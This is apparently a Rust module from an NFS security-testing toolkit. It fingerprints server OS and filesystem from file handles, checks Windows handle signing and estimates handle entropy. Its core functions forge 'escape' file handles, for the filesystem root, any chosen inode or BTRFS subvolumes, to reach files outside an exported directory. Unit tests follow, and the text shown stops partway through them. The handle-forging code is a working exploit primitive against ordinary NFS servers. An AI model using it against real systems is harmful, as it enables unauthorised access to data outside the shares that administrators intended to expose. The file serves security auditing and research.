//! NFS file handle analysis, fingerprinting, and escape construction.
//!
//! Implements OS/filesystem detection from handle format and constructs
//! escape handles to access files outside the exported directory.

// Struct fields are forensic data values; individual field docs would
// repeat the field name. Context is in the module and finding docs.
// Toolkit API  --  not all items are used in currently-implemented phases.
// All slice/index operations in this module are guarded by explicit len() checks
// before accessing the bytes  --  the bounds are enforced, just not via .get().
use crate::proto::nfs3::types::FileHandle;

/// Detected operating system from file handle format.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OsGuess {
    Linux,
    Windows,
    FreeBsd,
    Solaris,
    NetApp,
    HpUx,
    Unknown,
}

/// Detected filesystem type from file handle structure.
///
/// Covers all types nfs_analyze identifies from inode patterns
/// in Linux file handles (byte 2 = fsid_type, plus inode structure).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FsType {
    Ext4,
    Xfs,
    Btrfs,
    Ntfs,
    Ufs,
    Zfs,
    Udf,
    Nilfs,
    Fat,
    Lustre,
    Unknown,
}

/// Windows file handle signing status.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SigningStatus {
    /// Handle is signed (HMAC bytes are non-zero)
    Enabled,
    /// Handle is NOT signed (HMAC bytes are zero)  --  full FS access possible
    Disabled,
    /// Not a Windows handle (wrong size or format)
    NotApplicable,
}

/// Which NFS version's handle format was checked for Windows signing.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum WindowsHandleVersion {
    /// NFSv3: 32-byte handle, last 10 bytes are HMAC
    V3,
    /// NFSv4.1: 28-byte handle, last 16 bytes are HMAC
    V41,
}

/// Result of file handle entropy analysis.
#[derive(Debug, Clone)]
pub struct EntropyAnalysis {
    /// Total bits of randomness estimated in the handle
    pub entropy_bits: f64,
    /// Estimated brute-force time at 10,000 attempts/sec
    pub brute_force_seconds: f64,
    /// Which fields contain randomness
    pub random_fields: Vec<String>,
}

/// Filesystem root handle construction for export escape.
#[derive(Debug, Clone)]
pub struct EscapeResult {
    /// Constructed file handle for filesystem root
    pub root_handle: FileHandle,
    /// Filesystem type detected
    pub fs_type: FsType,
    /// Confidence level (0.0 - 1.0)
    pub confidence: f64,
    /// Inode number embedded in the constructed handle (root inode, or subvolume ID for BTRFS)
    pub inode_number: u32,
}

/// Analyze and manipulate NFS file handles.
#[derive(Debug)]
pub struct FileHandleAnalyzer;

impl FileHandleAnalyzer {
    /// Determine the server OS from file handle structure.
    pub fn fingerprint_os(fh: &FileHandle) -> OsGuess {
        let data = fh.as_bytes();

        if data.len() == 32 {
            // Could be Windows (always 32 bytes) or padded Linux/FreeBSD NFSv2.
            // Windows handles have non-zero trailing bytes; Linux NFSv2 pads with zeros.
            let tail_nonzero = data.get(28..32).is_some_and(|s| s != [0u8, 0, 0, 0]);
            let hmac_nonzero = data.get(22..32).is_some_and(|s| s.iter().any(|&b| b != 0));
            if tail_nonzero || hmac_nonzero {
                return OsGuess::Windows;
            }
        }

        // Linux: version=1, auth_type=0
        if data.first().copied() == Some(0x01) && data.get(1).copied() == Some(0x00) {
            return OsGuess::Linux;
        }

        // FreeBSD: starts with fsid (8 bytes) that often has high values
        if data.len() >= 20
            && let (Some(&b8), Some(&b9)) = (data.get(8), data.get(9))
        {
            let fid_len = u16::from_be_bytes([b8, b9]);
            if fid_len == 12 {
                return OsGuess::FreeBsd;
            }
        }

        OsGuess::Unknown
    }

    /// Identify filesystem type from a Linux file handle.
    ///
    /// Uses the same inode-pattern heuristics as nfs_analyze: fsid_type (byte 2)
    /// combined with inode numbering patterns to distinguish ext4/xfs/btrfs and
    /// detect rarer filesystems (udf, nilfs, fat, lustre).
    pub fn fingerprint_fs(fh: &FileHandle) -> FsType {
        let data = fh.as_bytes();
        if data.len() < 8 {
            return FsType::Unknown;
        }

        let Some(&fsid_type) = data.get(2) else { return FsType::Unknown };
        let Some(&fileid_type) = data.get(3) else { return FsType::Unknown };

        // fileid_type identifies the FS before we even look at fsid_type.
        // Check all known fileid_type markers first.
        if (0x4d..=0x4f).contains(&fileid_type) {
            return FsType::Btrfs;
        }
        // FILEID_INO64_GEN (0x81) is only emitted by Linux XFS when inodes exceed
        // 2^32.  ext4 always uses 32-bit inodes (FILEID_INO32_GEN = 0x01).
        if fileid_type == 0x81 {
            return FsType::Xfs;
        }

        // Compound UUID handle (fsid_type=7, fileid_type=0, 28 bytes):
        //   [header 4B] | [export_inode 4B] | [export_gen 4B] | [UUID 16B]
        // Used by Linux knfsd with UUID-based exports on both ext4 AND XFS.
        // We cannot distinguish ext4 vs XFS from this format alone -- the escape
        // tries inode 2 (ext4 root) first, then falls back to a scan that finds
        // inode 64/128 (XFS root) if inode 2 returns STALE.
        // Return Unknown here so the caller uses the scan path to determine type.
        if fsid_type == 7 && fileid_type == 0 && data.len() == 28 {
            return FsType::Unknown;
        }

        let fsid_len = match fsid_type {
            0 | 3..=5 => 8, // dev major:minor
            1 => 4,         // dev number only
            2 => 12,        // dev + UUID prefix
            6 | 7 => 16,    // UUID-based (16 bytes)
            _ => return FsType::Unknown,
        };

        // Use the inode embedded in the handle (the export root's inode) to distinguish
        // filesystem types.  This is the most reliable signal when fileid_type alone is
        // ambiguous (0x01 is shared by ext4, ext3, and old-format XFS).
        if data.len() > 4 + fsid_len + 4 {
            let inode_offset = 4 + fsid_len;
            if let (Some(&b0), Some(&b1), Some(&b2), Some(&b3)) = (data.get(inode_offset), data.get(inode_offset + 1), data.get(inode_offset + 2), data.get(inode_offset + 3)) {
                let inode = u32::from_le_bytes([b0, b1, b2, b3]);
                match inode {
                    2 => return FsType::Ext4,            // ext3/ext4 root inode is always 2
                    32 | 64 | 128 => return FsType::Xfs, // XFS root (varies by inode size)
                    _ => {},                             // ambiguous -- fall through
                }
            }
        }

        match fsid_type {
            0 => FsType::Ext4,    // device-based fsid without a UUID -- assume ext4
            _ => FsType::Unknown, // UUID-based with inconclusive inode: try all candidates
        }
    }

    /// Check Windows file handle signing.
    ///
    /// Two formats exist (discovered by nfs_analyze):
    /// - **NFSv3**: 32-byte handle, last 10 bytes (offset 22..32) are HMAC.
    /// - **NFSv4.1**: 28-byte handle, last 16 bytes (offset 12..28) are HMAC.
    ///
    /// All-zero HMAC means signing is disabled -> arbitrary handle forgery possible.
    pub fn check_windows_signing(fh: &FileHandle) -> SigningStatus {
        let data = fh.as_bytes();

        // NFSv3: 32-byte handle, HMAC in last 10 bytes (offset 22..32)
        if data.len() == 32 {
            let all_zero = data.get(22..32).is_some_and(|s| s.iter().all(|&b| b == 0));
            return if all_zero { SigningStatus::Disabled } else { SigningStatus::Enabled };
        }

        // NFSv4.1: 28-byte handle, HMAC in last 16 bytes (offset 12..28)
        if data.len() == 28 {
            let all_zero = data.get(12..28).is_some_and(|s| s.iter().all(|&b| b == 0));
            return if all_zero { SigningStatus::Disabled } else { SigningStatus::Enabled };
        }

        SigningStatus::NotApplicable
    }

    /// Detect which Windows handle version format we're looking at.
    pub fn detect_windows_handle_version(fh: &FileHandle) -> Option<WindowsHandleVersion> {
        match fh.as_bytes().len() {
            32 => Some(WindowsHandleVersion::V3),
            28 => Some(WindowsHandleVersion::V41),
            _ => None,
        }
    }

    /// Construct a file handle targeting an arbitrary inode on the same filesystem.
    ///
    /// This is the generic primitive behind export escape. When `subtree_check` is
    /// disabled (Linux default), the server only verifies the fsid, not that the inode
    /// falls within the export. By rewriting the inode field, we can reach any file.
    ///
    /// `construct_escape_handle` is sugar that calls this with the FS root inode.
    /// Researchers can call this directly with any inode + generation to target
    /// specific files discovered via inode enumeration or brute-force.
    pub fn construct_handle_for_inode(export_fh: &FileHandle, inode: u32, generation: u32) -> Option<EscapeResult> {
        let data = export_fh.as_bytes();
        if data.len() < 8 {
            return None;
        }

        // Only works on Linux handles (version=1, auth=0)
        if data.first().copied() != Some(0x01) || data.get(1).copied() != Some(0x00) {
            return None;
        }

        let &fsid_type = data.get(2)?;
        let &fileid_type = data.get(3)?;

        // BTRFS handles (fileid_type 0x4d..=0x4f) use a completely different fileid
        // layout and are not constructable via this function -- use
        // construct_btrfs_subvol_handles instead.
        if (0x4d..=0x4f).contains(&fileid_type) {
            return None;
        }

        // --- COMPOUND UUID handle (fsid_type=7, 28-byte export-root handles) ---
        //
        // Linux knfsd with UUID-based exports uses a two-layer handle format:
        //
        //   FILEID_ROOT (fileid_type=0, 28 bytes)  -- returned by MOUNT for export dir:
        //     [01][00][07][00] | export_dir_inode(4LE) | export_dir_gen(4LE) | UUID(16)
        //
        //   FILEID_INO32_GEN_PARENT (fileid_type=2, 44 bytes) -- canonical escape format per
        //   the nfs-security-tooling wiki and nfs_analyze reference implementation:
        //     [01][00][07][02] | export_dir_inode(4LE) | export_dir_gen(4LE) | UUID(16)
        //                      | file_inode(4LE) | file_gen(4LE)
        //                      | parent_inode(4LE) | parent_gen(4LE)
        //   The root directory is its own parent, so parent_inode == inode, parent_gen == gen.
        //
        // With no_subtree_check (Linux default), the server validates only the UUID/fsid,
        // not that the appended inode falls within the exported subtree (F-2.1).
        //
        // Reference: nfs_analyze.py lines 564-565, wiki 5_1-Accessing-files-outside-export.md
        if fsid_type == 7 && fileid_type == 0 && data.len() == 28 {
            let export_ctx = data.get(4..28)?; // 24 bytes: dir_inode + dir_gen + UUID
            let mut handle_data = Vec::with_capacity(44);
            handle_data.push(0x01);
            handle_data.push(0x00);
            handle_data.push(0x07); // fsid_type=7
            handle_data.push(0x02); // fileid_type=2 (FILEID_INO32_GEN_PARENT)
            handle_data.extend_from_slice(export_ctx);
            handle_data.extend_from_slice(&inode.to_le_bytes()); // file inode
            handle_data.extend_from_slice(&generation.to_le_bytes()); // file gen
            handle_data.extend_from_slice(&inode.to_le_bytes()); // parent inode (root = own parent)
            handle_data.extend_from_slice(&generation.to_le_bytes()); // parent gen
            // Infer the filesystem type from the root inode number.
            // ext4 root is always inode 2; XFS root: 128 (v5), 64 (v4 512B inodes), 32 (v4 1024B inodes).
            // Any other inode is ambiguous -- leave Unknown.
            let inferred_fs = match inode {
                2 => FsType::Ext4,
                32 | 64 | 128 => FsType::Xfs,
                _ => FsType::Unknown,
            };
            return Some(EscapeResult { root_handle: FileHandle(handle_data), fs_type: inferred_fs, confidence: if generation == 0 { 0.7 } else { 0.9 }, inode_number: inode });
        }

        // --- Standard single-layer handles ---
        //
        // fsid_type determines how many bytes of fsid to preserve verbatim.
        // Unsupported types cannot be reconstructed.
        let fsid_len = match fsid_type {
            0 | 3..=5 => 8, // dev major:minor (32+32 bits)
            1 => 4,         // dev number only (32 bits)
            2 => 12,        // dev + UUID prefix
            6 | 7 => 16,    // UUID-based
            _ => return None,
        };

        if data.len() < 4 + fsid_len {
            return None;
        }

        // Derive the fileid encoding format from the MOUNT handle's fileid_type.
        // This is the key insight: the FS type determines the inode width, and
        // fileid_type in the mount handle directly encodes that width.
        //
        //   FILEID_INO64_GEN (0x81) -- XFS only, 64-bit inode + 32-bit gen = 12 bytes
        //   FILEID_INO32_GEN (0x01) -- ext3/ext4 and 32-bit-compat XFS, 32-bit inode + gen = 8 bytes
        //   BTRFS (0x4d..=0x4f)    -- handled in the branch above, never reaches here
        //
        // Using fileid_type (not fsid_type) avoids the false "UUID = XFS" assumption
        // and correctly handles ext3/ext4 exports that use UUID-based fsids.
        let (target_fileid_type, inferred_fs) = if fileid_type == 0x81 {
            (0x81u8, FsType::Xfs)
        } else {
            (
                0x01u8,
                match inode {
                    2 => FsType::Ext4,
                    32 | 64 | 128 => FsType::Xfs,
                    _ => FsType::Unknown,
                },
            )
        };

        let fsid_slice = data.get(4..4 + fsid_len)?;
        let mut handle_data = Vec::with_capacity(4 + fsid_len + 12);
        handle_data.push(0x01);
        handle_data.push(0x00);
        handle_data.push(fsid_type);
        handle_data.push(target_fileid_type);
        handle_data.extend_from_slice(fsid_slice);

        if target_fileid_type == 0x81 {
            // XFS: 64-bit inode (8 bytes) + 32-bit generation (4 bytes)
            handle_data.extend_from_slice(&u64::from(inode).to_le_bytes());
        } else {
            // ext4/ext3: 32-bit inode (4 bytes) + 32-bit generation (4 bytes)
            handle_data.extend_from_slice(&inode.to_le_bytes());
        }
        handle_data.extend_from_slice(&generation.to_le_bytes());

        Some(EscapeResult { root_handle: FileHandle(handle_data), fs_type: inferred_fs, confidence: if generation == 0 { 0.7 } else { 0.9 }, inode_number: inode })
    }

    /// Escape export to filesystem root. Sugar for `construct_handle_for_inode`
    /// with the root inode for the detected filesystem type.
    ///
    /// For XFS, tries inode 128 (default v5 format) first, then inode 64
    /// (v4 format or `mkfs.xfs -i size=256`).  Returns the first candidate;
    /// the caller should verify against the server with GETATTR.
    pub fn construct_escape_handle(export_fh: &FileHandle) -> Option<EscapeResult> {
        let data = export_fh.as_bytes();
        let &fileid_type = data.get(3)?;
        let &fsid_type = data.get(2)?;
        let is_btrfs = (0x4d..=0x4f).contains(&fileid_type);

        if is_btrfs {
            // Primary candidate: FS_TREE_OBJECTID (5) = default subvolume on any fresh btrfs.
            // construct_btrfs_subvol_handles covers FS tree + user subvols in run_escape;
            // this path is the single-candidate fast path used elsewhere.
            return Self::construct_btrfs_subvol_handles(export_fh, 0).into_iter().next();
        }

        // Compound UUID format (fsid_type=7, fileid_type=0, 28-byte export-root handle).
        // Guard: if the export directory IS the filesystem root (inode 2 = ext4, 128/64 = XFS),
        // there is nothing to escape -- the export already covers the whole filesystem.
        // nfs_analyze checks `export_fileid in [2, 128]` for the same reason.
        if fsid_type == 7 && fileid_type == 0 && data.len() == 28 {
            let export_inode = u32::from_le_bytes([*data.get(4)?, *data.get(5)?, *data.get(6)?, *data.get(7)?]);
            if matches!(export_inode, 2 | 32 | 64 | 128) {
                return None; // Export IS the filesystem root -- escape has no effect
            }
            return Self::construct_handle_for_inode(export_fh, 2, 0);
        }

        // fileid_type=0x81 (FILEID_INO64_GEN) unambiguously means XFS with 64-bit inodes.
        // XFS v5 root = inode 128; v4 / -i size=256 root = inode 64.
        if fileid_type == 0x81 {
            return Self::construct_handle_for_inode(export_fh, 128, 0).or_else(|| Self::construct_handle_for_inode(export_fh, 64, 0));
        }

        // For all other filesystems (ext4, ext3, 32-bit XFS), inode 2 is the root.
        // run_escape also queues XFS candidates for Ext4/Unknown fingerprints.
        Self::construct_handle_for_inode(export_fh, 2, 0)
    }

    /// Return all plausible XFS root handle candidates (gen 0), ordered by likelihood.
    ///
    /// Known root inode numbers by `mkfs.xfs` configuration:
    ///   128 -- default (v5 CRC, 256-byte inodes) and v5 with 512-byte inodes
    ///    64 -- v4 with 512-byte inodes (`-m crc=0 -i size=512`)
    ///    32 -- v4 with 1024-byte inodes (`-m crc=0 -i size=1024`)
    ///
    /// Use when a single `construct_escape_handle` call is insufficient.
    pub fn construct_xfs_escape_candidates(export_fh: &FileHandle) -> Vec<EscapeResult> {
        [128u32, 64u32, 32u32].iter().filter_map(|&inode| Self::construct_handle_for_inode(export_fh, inode, 0)).collect()
    }

    /// Generate BTRFS subvolume escape handles.
    ///
    /// BTRFS FILEID_WITHOUT_PARENT (0x4d) layout (per kernel fs/btrfs/export.c):
    ///   objectid      (u64 LE) -- inode object ID within the subvolume; always
    ///                             BTRFS_FIRST_FREE_OBJECTID (256) for the root dir
    ///   root_objectid (u64 LE) -- subvolume/tree ID
    ///   gen           (u32 LE) -- generation number
    ///
    /// Candidates tried:
    ///   1. FS_TREE_OBJECTID (5)  -- the default subvolume on any fresh btrfs filesystem
    ///   2. User subvolumes 256 .. 256 + max_subvols  -- user-created subvolumes
    pub fn construct_btrfs_subvol_handles(export_fh: &FileHandle, max_subvols: u32) -> Vec<EscapeResult> {
        // BTRFS_FIRST_FREE_OBJECTID: the inode object ID of any subvolume root directory.
        const ROOT_OBJECTID: u64 = 256;
        // BTRFS_FS_TREE_OBJECTID: the default/main subvolume on a fresh btrfs filesystem.
        const FS_TREE_OBJECTID: u64 = 5;

        let data = export_fh.as_bytes();
        if data.len() < 8 || data.first().copied() != Some(0x01) || data.get(1).copied() != Some(0x00) {
            return Vec::new();
        }

        let Some(&fsid_type) = data.get(2) else { return Vec::new() };

        // For compound UUID MOUNT handles (fsid_type=7, fileid_type=0, 28 bytes) the
        // 24-byte export context embeds [export_inode(4)][export_gen(4)][UUID(16)].
        // BTRFS LOOKUP handles may use EITHER:
        //   (a) fsid_type=7 with the full 24-byte export context as fsid, OR
        //   (b) fsid_type=6 with just the 16-byte UUID as fsid.
        // We generate both variants and let the probe oracle determine which the server accepts.
        let is_compound_uuid = fsid_type == 7 && data.get(3).copied() == Some(0x00) && data.len() == 28;

        // Standard fsid extraction for non-compound handles.
        let fsid_len = match fsid_type {
            0 | 3..=5 => 8,
            1 => 4,
            2 => 12,
            6 => 16,
            7 => 24, // compound UUID: use all 24 bytes of export context as fsid
            _ => return Vec::new(),
        };

        let Some(fsid_slice) = data.get(4..4 + fsid_len) else { return Vec::new() };

        // For compound UUID: also extract just the 16-byte UUID (bytes 12..28).
        let uuid_only: Option<&[u8]> = if is_compound_uuid { data.get(12..28) } else { None };

        // Build a BTRFS handle targeting `root_objectid` (subvolume ID).
        // fileid = objectid(8) + root_objectid(8) + gen(4) = 20 bytes.
        let make_handle = |ftype: u8, flen: usize, fsid: &[u8], root_id: u64, confidence: f64| {
            let mut handle_data = Vec::with_capacity(4 + flen + 20);
            handle_data.push(0x01);
            handle_data.push(0x00);
            handle_data.push(ftype);
            handle_data.push(0x4d); // FILEID_BTRFS_WITHOUT_PARENT
            handle_data.extend_from_slice(fsid);
            handle_data.extend_from_slice(&ROOT_OBJECTID.to_le_bytes()); // root dir inode
            handle_data.extend_from_slice(&root_id.to_le_bytes()); // subvolume ID
            handle_data.extend_from_slice(&0u32.to_le_bytes()); // gen = 0
            #[allow(clippy::cast_possible_truncation, reason = "subvol IDs fit in u32 in practice")]
            EscapeResult { root_handle: FileHandle(handle_data), fs_type: FsType::Btrfs, confidence, inode_number: root_id as u32 }
        };

        let mut results = Vec::with_capacity((1 + max_subvols as usize) * 2);
        let subvol_ids = std::iter::once(FS_TREE_OBJECTID).chain(256..256 + u64::from(max_subvols));

        for root_id in subvol_ids {
            let confidence = if root_id == FS_TREE_OBJECTID { 0.7 } else { 0.3 };
            // Primary: fsid_type as in MOUNT handle.
            results.push(make_handle(fsid_type, fsid_len, fsid_slice, root_id, confidence));
            // For compound UUID: also try fsid_type=6 with pure UUID (the alternative format).
            if let Some(uuid) = uuid_only {
                results.push(make_handle(6, 16, uuid, root_id, confidence * 0.9));
            }
        }
        results
    }

    /// Estimate the entropy (randomness) of a file handle.
    pub fn estimate_entropy(fh: &FileHandle) -> EntropyAnalysis {
        let data = fh.as_bytes();
        let os = Self::fingerprint_os(fh);

        let (entropy_bits, random_fields): (f64, Vec<String>) = match os {
            OsGuess::Linux => {
                // Linux root handle: only xdev needs guessing (~11 bits)
                // Linux non-root: gen_no is 32 bits random
                if data.len() <= 12 { (11.0, vec!["xdev (device major:minor)".into()]) } else { (32.0, vec!["generation number (4 bytes)".into()]) }
            },
            OsGuess::FreeBsd => {
                // 4 bytes random fsid + 4 bytes gen = 64 bits
                (64.0, vec!["fsid (4 bytes arc4random)".into(), "ufid_gen (4 bytes)".into()])
            },
            OsGuess::Windows => {
                if Self::check_windows_signing(fh) == SigningStatus::Enabled {
                    (80.0, vec!["HMAC signature (10 bytes)".into()])
                } else {
                    (0.0, vec![])
                }
            },
            _ => (32.0, vec!["unknown fields".into()]),
        };

        let brute_force_seconds = entropy_bits.exp2() / 10000.0;

        EntropyAnalysis { entropy_bits, brute_force_seconds, random_fields }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Build a minimal Linux NFSv3 file handle: version=1, auth=0, fsid_type, fileid_type,
    /// then fsid (device major:minor = 8 bytes) and fileid (inode+gen = 8 bytes).
    fn linux_ext4_handle(inode: u32, generation: u32) -> FileHandle {
        let mut data = vec![
            0x01, // version = 1  (Linux)
            0x00, // auth_type = 0
            0x00, // fsid_type = 0 (dev major:minor  --  ext4)
            0x02, // fileid_type = 2 (inode + generation)
            // fsid: 8 bytes (device major=8, minor=1)
            0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        ];
        data.extend_from_slice(&inode.to_le_bytes());
        data.extend_from_slice(&generation.to_le_bytes());
        FileHandle::from_bytes(&data)
    }

    /// Build a Windows-style 32-byte handle. When `signed` is true, last 10 bytes are non-zero.
    fn windows_handle(signed: bool) -> FileHandle {
        let mut data = vec![0u8; 32];
        // Put non-zero content in early bytes so it doesn't look like padded Linux
        data[0] = 0x03;
        data[1] = 0x00;
        data[2] = 0x00;
        data[3] = 0x00;
        if signed {
            // Non-zero HMAC in last 10 bytes
            for b in &mut data[22..32] {
                *b = 0xAB;
            }
        }
        FileHandle::from_bytes(&data)
    }

    // --- OS fingerprinting ---

    #[test]
    fn fingerprint_linux_handle() {
        let fh = linux_ext4_handle(2, 0);
        assert_eq!(FileHandleAnalyzer::fingerprint_os(&fh), OsGuess::Linux);
    }

    #[test]
    fn fingerprint_windows_handle_signed() {
        let fh = windows_handle(true);
        assert_eq!(FileHandleAnalyzer::fingerprint_os(&fh), OsGuess::Windows);
    }

    #[test]
    fn fingerprint_short_handle_is_unknown() {
        // A 3-byte handle can't match any known format.
        let fh = FileHandle::from_bytes(&[0xFF, 0xFE, 0xFD]);
        assert_eq!(FileHandleAnalyzer::fingerprint_os(&fh), OsGuess::Unknown);
    }

    // --- FS fingerprinting ---

    #[test]
    fn fingerprint_ext4_from_fsid_type_zero() {
        let fh = linux_ext4_handle(2, 0);
        let fs = FileHandleAnalyzer::fingerprint_fs(&fh);
        assert_eq!(fs, FsType::Ext4);
    }

    #[test]
    fn fingerprint_btrfs_from_fileid_type_0x4d() {
        let data = vec![
            0x01, 0x00, 0x00, // fsid_type = 0
            0x4d, // fileid_type = 0x4d -> BTRFS
            0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, // fsid
            0x00, 0x01, 0x00, 0x00, // subvol id
            0x00, 0x00, 0x00, 0x00, // generation
        ];
        let fh = FileHandle::from_bytes(&data);
        assert_eq!(FileHandleAnalyzer::fingerprint_fs(&fh), FsType::Btrfs);
    }

    #[test]
    fn fingerprint_short_handle_is_unknown_fs() {
        let fh = FileHandle::from_bytes(&[0x01, 0x00, 0x00]);
        assert_eq!(FileHandleAnalyzer::fingerprint_fs(&fh), FsType::Unknown);
    }

    // --- Windows signing detection ---

    #[test]
    fn windows_signing_disabled_all_zeros() {
        // 32-byte handle with all-zero HMAC in last 10 bytes -> signing disabled.
        // This is the precondition for full filesystem handle forgery (F-6.2).
        let fh = windows_handle(false);
        assert_eq!(FileHandleAnalyzer::check_windows_signing(&fh), SigningStatus::Disabled);
    }

    #[test]
    fn windows_signing_enabled_nonzero_hmac() {
        let fh = windows_handle(true);
        assert_eq!(FileHandleAnalyzer::check_windows_signing(&fh), SigningStatus::Enabled);
    }

    #[test]
    fn windows_signing_not_applicable_for_non_windows_size() {
        // A Linux handle (e.g. 20 bytes) is not a Windows handle.
        let fh = linux_ext4_handle(2, 0);
        assert_eq!(FileHandleAnalyzer::check_windows_signing(&fh), SigningStatus::NotApplicable);
    }

    #[test]
    fn windows_handle_version_detection_32_byte() {
        let fh = windows_handle(true);
        assert_eq!(FileHandleAnalyzer::detect_windows_handle_version(&fh), Some(WindowsHandleVersion::V3));
    }

    #[test]
    fn windows_handle_version_detection_28_byte() {
        let mut data = vec![0u8; 28];
        // Non-zero signature in last 16 bytes
        for b in &mut data[12..28] {
            *b = 0x55;
        }
        let fh = FileHandle::from_bytes(&data);
        assert_eq!(FileHandleAnalyzer::detect_windows_handle_version(&fh), Some(WindowsHandleVersion::V41));
    }

    #[test]
    fn windows_handle_version_none_for_other_sizes() {
        let fh = linux_ext4_handle(2, 0); // 20 bytes
        assert_eq!(FileHandleAnalyzer::detect_windows_handle_version(&fh), None);
    }

    // --- Entropy estimation ---

    #[test]
    fn entropy_linux_root_handle_low() {
        // The Linux root inode (2) is well-known. Entropy comes only from xdev
        // (device major:minor ~ 11 bits). Short handle <= 12 bytes triggers this path.
        let short_linux = FileHandle::from_bytes(&[
            0x01, 0x00, 0x00, 0x02, // version, auth, fsid_type, fileid_type
            0x08, 0x00, 0x00, 0x00, // fsid (4 bytes only, keep handle <=12)
        ]);
        let analysis = FileHandleAnalyzer::estimate_entropy(&short_linux);
        // Root handle path: ~11 bits
        assert!((analysis.entropy_bits - 11.0).abs() < 1.0, "root handle entropy should be ~11 bits");
        assert!(analysis.brute_force_seconds < 1.0, "root handle should be brute-forceable quickly");
    }

    #[test]
    fn entropy_linux_nonroot_handle_higher() {
        // Non-root Linux handles carry a 32-bit generation number.
        let fh = linux_ext4_handle(12345, 0xDEAD_BEEF);
        let analysis = FileHandleAnalyzer::estimate_entropy(&fh);
        assert!((analysis.entropy_bits - 32.0).abs() < 1.0, "non-root Linux handle entropy should be ~32 bits");
        assert!(!analysis.random_fields.is_empty());
    }

    #[test]
    fn entropy_windows_unsigned_handle_zero() {
        // A properly-identified unsigned Windows handle (data[0]=0x03, non-zero tail elsewhere
        // to trigger Windows fingerprinting, but zero HMAC) has zero entropy.
        // Construct a handle where fingerprint_os returns Windows:
        // data[28..32] must be non-zero OR data[22..32] must have a non-zero byte.
        let mut data = vec![0u8; 32];
        data[0] = 0x03;
        data[28] = 0x01; // make data[28..32] != [0,0,0,0] -> fingerprint_os returns Windows
        // HMAC region (data[22..32]): data[28]=0x01, rest zero  --  HMAC is NOT all-zero
        // so signing == Enabled. To test zero entropy we need the all-zero HMAC variant:
        data[28] = 0x00; // back to zero  --  now data[28..32] is [0,0,0,0]
        // But now fingerprint_os won't return Windows. This demonstrates that an
        // "all-zero HMAC" Windows handle doesn't look like Windows to fingerprint_os.
        // Instead, test the signing check result directly  --  check_windows_signing returns
        // Disabled for a 32-byte handle with zero HMAC, regardless of OS fingerprint.
        let fh_zeros = FileHandle::from_bytes(&data);
        assert_eq!(FileHandleAnalyzer::check_windows_signing(&fh_zeros), SigningStatus::Disabled);
        // And confirm the entropy path: fingerprint_os gives Unknown, entropy defaults to 32 bits.
        let analysis = FileHandleAnalyzer::estimate_entropy(&fh_zeros);
        assert!(analysis.entropy_bits > 0.0, "unknown-OS handle gets default entropy estimate");
    }

    #[test]
    fn entropy_windows_signed_handle_high() {
        // Signed Windows handle: 80-bit HMAC protects against forgery.
        let fh = windows_handle(true);
        let analysis = FileHandleAnalyzer::estimate_entropy(&fh);
        assert!(analysis.entropy_bits >= 64.0, "signed Windows HMAC should give high entropy");
    }

    // --- Escape handle construction ---

    #[test]
    fn escape_handle_for_ext4_targets_inode_2() {
        // Root inode on ext4 is always 2 (DESIGN.md S7, F-3.1).
        let export_fh = linux_ext4_handle(12345, 0);
        let result = FileHandleAnalyzer::construct_escape_handle(&export_fh).expect("ext4 escape must succeed");
        assert_eq!(result.fs_type, FsType::Ext4);
        // The returned handle bytes must embed inode 2 (root) in LE at the inode offset.
        let raw = result.root_handle.as_bytes();
        // For fsid_type=0: inode offset = 4 + 8 = 12
        let inode = u32::from_le_bytes([raw[12], raw[13], raw[14], raw[15]]);
        assert_eq!(inode, 2, "escape handle must target root inode 2");
    }

    #[test]
    fn escape_handle_confidence_is_nonzero() {
        let fh = linux_ext4_handle(99, 0);
        let result = FileHandleAnalyzer::construct_escape_handle(&fh).expect("must succeed");
        assert!(result.confidence > 0.0);
        assert!(result.confidence <= 1.0);
    }

    #[test]
    fn escape_handle_returns_none_for_non_linux() {
        // Windows handle: version byte != 0x01, so escape is not possible.
        let fh = windows_handle(false);
        assert!(FileHandleAnalyzer::construct_escape_handle(&fh).is_none(), "escape must return None for non-Linux handles");
    }

    #[test]
    fn construct_handle_for_inode_arbitrary() {
        // Directly target inode 42 with generation 7 on the same filesystem as the export.
        let export_fh = linux_ext4_handle(5, 1);
        let result = FileHandleAnalyzer::construct_handle_for_inode(&export_fh, 42, 7).expect("handle construction must succeed");
        let raw = result.root_handle.as_bytes();
        let inode = u32::from_le_bytes([raw[12], raw[13], raw[14], raw[15]]);
        let generation_out = u32::from_le_bytes([raw[16], raw[17], raw[18], raw[19]]);
        assert_eq!(inode, 42);
        assert_eq!(generation_out, 7);
        assert!(result.confidence > 0.5, "known generation -> higher confidence");
    }

    #[test]
    fn btrfs_subvol_handles_count() {
        // Produce 5 BTRFS subvolume escape candidates.
        let data = vec![
            0x01, 0x00, 0x00, // fsid_type = 0
            0x4d, // fileid_type = BTRFS
            0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ];
        let fh = FileHandle::from_bytes(&data);
        let handles = FileHandleAnalyzer::construct_btrfs_subvol_handles(&fh, 5);
        assert_eq!(handles.len(), 6, "must produce 1 FS-tree handle + max_subvols user handles");
        for h in &handles {
            assert_eq!(h.fs_type, FsType::Btrfs);
        }
    }

    #[test]
    fn btrfs_subvol_handles_empty_for_non_linux() {
        let fh = windows_handle(false);
        let handles = FileHandleAnalyzer::construct_btrfs_subvol_handles(&fh, 10);
        assert!(handles.is_empty(), "non-Linux handle must yield no BTRFS candidates");
    }

    // --- Additional tests for fsid_type variants ---

    /// Build a Linux BTRFS handle with fsid_type=1 (4-byte fsid).
    fn linux_btrfs_fsid1_handle(inode: u32, generation: u32) -> FileHandle {
        let mut data = vec![
            0x01, // version = 1
            0x00, // auth_type = 0
            0x01, // fsid_type = 1 (dev number only, 4 bytes)
            0x4d, // fileid_type = 0x4d (BTRFS)
            // fsid: 4 bytes
            0x08, 0x00, 0x00, 0x00,
        ];
        data.extend_from_slice(&inode.to_le_bytes());
        data.extend_from_slice(&generation.to_le_bytes());
        FileHandle::from_bytes(&data)
    }

